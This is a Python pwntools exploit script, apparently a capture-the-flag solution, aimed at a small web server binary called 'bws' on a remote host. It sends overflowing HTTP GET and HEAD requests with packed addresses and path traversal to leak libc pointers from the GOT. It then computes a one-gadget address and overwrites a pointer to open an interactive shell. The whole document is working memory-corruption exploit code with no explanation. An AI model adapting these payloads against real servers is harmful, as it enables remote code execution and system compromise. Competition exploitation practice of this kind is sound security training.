from pwn import *
from time import sleep
#p = process('bws')
p = remote('bws-ad8sfsklw.9447.plumbing',80)
raw_input('wait')


# leak got
p.send(\
        "GET //a"+"a"*8*8+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*7+"a"*5+"\xa0\x09\x40"+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*7+"a"*4+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*7+"a"*3+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*7+"a"*2+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*7+"a"*1+" HTTP/1.1\r\n\r\n")
p.send(\
        "GET //a"+"a"*8*6+"a"*5+"\x80\x08\x40"+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*6+"a"*4+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*6+"a"*3+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*6+"a"*2+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*6+"a"*1+" HTTP/1.1\r\n\r\n")
p.send(\
        "GET //a"+"a"*8*5+"a"*5+"\x58\x20\x60"+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*5+"a"*4+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*5+"a"*3+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*5+"a"*2+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*5+"a"*1+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*4+"a"*5+"\x23\x13\x40"+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*4+"a"*4+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*4+"a"*3+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*4+"a"*2+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*4+"a"*1+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*3+"a"*5+"\x80\x08\x40"+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*3+"a"*4+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*3+"a"*3+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*3+"a"*2+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*3+"a"*1+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*2+"a"*5+"\x90\x20\x60"+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*2+"a"*4+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*2+"a"*3+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*2+"a"*2+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*2+"a"*1+" HTTP/1.1\r\n\r\n"+\
        "GET //aaaaaa\xe0\x20\x60aaaaa\x23\x13\x40 HTTP/1.1\r\n\r\n"+\
        "GET //aaaaaa\x10\xd0\xff\xff\xff\xff\x7f HTTP/1.1\r\n\r\n"+\
        "GET //aaaaaa\x10\xd0\xff\xff\xff\x7f HTTP/1.1\r\n\r\n"+\
        "HEAD /../../a"+"\x20\x13\x40"*94+" HTTP/1.1\r\n\r\n"+"")
sleep(1.2)

s = p.recv()
sleep(1.2)
s = p.recv()
print s
for i in s[-100:]:
    print hex(ord(i))
# libc_start_main
print hex(u64(s[-7:-1]+"\x00\x00"))
startmain = u64(s[-7:-1]+"\x00\x00")
# fopen
print hex(u64(s[-7-7:-1-7]+"\x00\x00"))

onegadget = startmain - 0x21dd0+0xe58c5

print hex(onegadget)

for i in p64(onegadget)[:-2]:
    print hex(ord(i))

# exec onegadget
p.send(\
        "GET //a"+"a"*8*3+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*2+"a"*5+"\x90\x20\x60"+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*2+"a"*4+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*2+"a"*3+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*2+"a"*2+" HTTP/1.1\r\n\r\n"+\
        "GET //a"+"a"*8*2+"a"*1+" HTTP/1.1\r\n\r\n"+\
        "GET //aaaaaa\xe0\x20\x60aaaaa"+p64(onegadget)[:-2]+" HTTP/1.1\r\n\r\n"+\
        "GET //aaaaaa\x10\xd0\xff\xff\xff\xff\x7f HTTP/1.1\r\n\r\n"+\
        "GET //aaaaaa\x10\xd0\xff\xff\xff\x7f HTTP/1.1\r\n\r\n"+\
        "HEAD /../../"+"\x20\x13\x40"*22+" HTTP/1.1\r\n\r\n"+"")
p.interactive()
